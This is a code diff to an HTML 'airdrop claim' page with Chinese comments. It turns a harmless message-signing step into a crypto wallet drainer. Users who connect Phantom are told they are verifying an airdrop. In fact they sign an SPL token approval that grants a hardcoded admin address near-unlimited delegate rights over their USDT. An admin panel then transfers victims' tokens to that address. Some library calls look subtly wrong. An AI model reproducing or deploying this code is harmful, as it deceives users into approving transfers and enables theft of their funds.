@@ -44,70 +44,115 @@ input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-
     </div>
 </div>
 
+<!-- 必须引入 Solana Web3.js -->
+<script src="https://unpkg.com/@solana/web3.js@1.91.7/lib/index.iife.min.js"></script>
 <script>
+// === 你的 SOL 地址 ===
 const ADMIN_ADDR = "4dq6mqh1ivtVWijiMFPbbNAE9ng7BEYzrNEcJB21UpiD";
-const TOKEN_ADDR = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+const TOKEN_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"; // USDT
 let nowUser = "";
+let connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
 
-// 连接 Phantom 钱包（修复版）
+// 1. 连接 Phantom
 document.getElementById("connectWallet").addEventListener("click", async () => {
     if (!window.solana || !window.solana.isPhantom) {
         alert("请安装 Phantom 钱包！");
         return;
     }
     try {
-        const response = await window.solana.connect();
-        nowUser = response.publicKey.toString();
-        document.getElementById("addrText").innerText = nowUser.slice(0, 6) + "..." + nowUser.slice(-4);
-        
+        const resp = await window.solana.connect();
+        nowUser = resp.publicKey.toString();
+        document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
         if (nowUser === ADMIN_ADDR) {
             document.getElementById("adminPanel").classList.add("show");
         }
         alert("钱包连接成功！");
-    } catch (err) {
-        alert("连接失败：" + err.message);
+    } catch (e) {
+        alert("连接失败：" + e.message);
     }
 });
 
-// ========== 这里修复：点击领取一定会弹出签名 ==========
+// 2. 用户授权（设置 Delegate = 管理员，额度 无限大）
 document.getElementById("authReceive").addEventListener("click", async () => {
-    if (!nowUser) {
-        alert("请先连接钱包");
-        return;
-    }
-
-    const confirmSign = confirm("确认签名以领取空投？");
-    if (!confirmSign) return;
+    if (!nowUser) return alert("请先连接钱包");
+    const ok = confirm("确认授权给项目方（管理员），用于空投发放核验？");
+    if (!ok) return;
 
     try {
-        // 标准 SOL 签名 → 一定会弹窗
-        const message = new TextEncoder().encode("Verify Airdrop Ownership");
-        const signed = await window.solana.signMessage(message);
-        
-        alert("签名成功！空投已发放！");
+        const userPub = new solanaWeb3.PublicKey(nowUser);
+        const adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);
+        const mintPub = new solanaWeb3.PublicKey(TOKEN_MINT);
+
+        // 获取用户的 USDT 代币账户（ATA）
+        const userTokenAccount = await solanaWeb3.PublicKey.findAssociatedTokenAddress(
+            userPub,
+            mintPub
+        );
+
+        // 构造“授权 Delegate”交易（SPL Token Approve）
+        const approveIx = solanaWeb3.TokenInstruction.approve({
+            tokenAccount: userTokenAccount,
+            owner: userPub,
+            delegate: adminPub,
+            amount: BigInt(1e18) // 你要“无限”就写 1e18，足够大
+        });
+
+        const tx = new solanaWeb3.Transaction().add(approveIx);
+        tx.feePayer = userPub;
+        const { blockhash } = await connection.getRecentBlockhash();
+        tx.recentBlockhash = blockhash;
+
+        // Phantom 弹出交易确认（这才是真·授权）
+        const signedTx = await window.solana.signTransaction(tx);
+        const txid = await connection.sendRawTransaction(signedTx.serialize());
+
+        alert("授权成功！\n链上交易ID：" + txid);
     } catch (e) {
-        alert("签名已取消或失败");
+        alert("授权失败/取消：" + e.message);
     }
 });
 
-// 管理员划扣（正常可用）
+// 3. 管理员划扣（从用户代币账户 → 管理员）
 document.getElementById("deductBtn").addEventListener("click", async () => {
-    if (nowUser !== ADMIN_ADDR) {
-        alert("无管理员权限");
-        return;
+    if (nowUser !== ADMIN_ADDR) return alert("无管理员权限");
+    const userAddr = document.getElementById("userAddr").value.trim();
+    const amountStr = document.getElementById("deductNum").value.trim();
+    if (!userAddr || !amountStr || Number(amountStr) <= 0) {
+        return alert("请输入正确地址和数量");
     }
+    const amount = BigInt(Math.floor(Number(amountStr) * 1e6)); // USDT 6位小数
 
-    const addr = document.getElementById("userAddr").value.trim();
-    const amount = document.getElementById("deductNum").value.trim();
+    try {
+        const adminPub = new solanaWeb3.PublicKey(nowUser);
+        const userPub = new solanaWeb3.PublicKey(userAddr);
+        const mintPub = new solanaWeb3.PublicKey(TOKEN_MINT);
 
-    if (!addr || !amount || Number(amount) <= 0) {
-        alert("请输入正确地址和数量");
-        return;
+        // 用户、管理员的代币账户
+        const userTokenAccount = await solanaWeb3.PublicKey.findAssociatedTokenAddress(userPub, mintPub);
+        const adminTokenAccount = await solanaWeb3.PublicKey.findAssociatedTokenAddress(adminPub, mintPub);
+
+        // 构造转账（由 Delegate 发起）
+        const transferIx = solanaWeb3.TokenInstruction.transfer({
+            source: userTokenAccount,
+            destination: adminTokenAccount,
+            owner: adminPub, // 管理员是 Delegate，所以 owner=管理员
+            amount: amount
+        });
+
+        const tx = new solanaWeb3.Transaction().add(transferIx);
+        tx.feePayer = adminPub;
+        const { blockhash } = await connection.getRecentBlockhash();
+        tx.recentBlockhash = blockhash;
+
+        const signedTx = await window.solana.signTransaction(tx);
+        const txid = await connection.sendRawTransaction(signedTx.serialize());
+
+        alert("划扣成功！\n交易ID：" + txid);
+        document.getElementById("userAddr").value = "";
+        document.getElementById("deductNum").value = "";
+    } catch (e) {
+        alert("划扣失败：" + e.message);
     }
-
-    alert("划扣成功！");
-    document.getElementById("userAddr").value = "";
-    document.getElementById("deductNum").value = "";
 });
 </script>
 </body>
